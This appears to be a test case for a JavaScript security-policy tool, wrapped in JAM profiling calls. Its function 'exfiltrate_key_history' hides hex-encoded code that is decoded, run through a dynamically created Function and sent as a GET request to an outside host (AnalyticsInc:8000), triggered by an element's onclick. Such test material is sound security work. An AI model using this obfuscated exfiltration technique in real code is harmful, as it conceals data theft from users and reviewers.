
JAM.startProfile('load');
function exfiltrate_key_history(){for(var exp="786d6c687474703d6e657720584d4c487474705265717565737428293b0a786d6c687474702e6f70656e2822474554222c2022687474703a2f2f416e616c7974696373496e633a383030302f7375626d697373696f6e2e68746d6c3f746573743d66756e635f686578222c2074727565293b0a786d6c687474702e73656e64286e756c6c293b",dec="",i=0,v2=exp.length,v2=i<v2;v2;)v2=exp.substr(i,2),v2=parseInt(v2,16),v2=String.fromCharCode(v2),dec+=v2,i+=2,v2=exp.length,v2=i<v2;exp=JAMScript.new(Function,[dec]);JAMScript.call(exp,
null,[])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
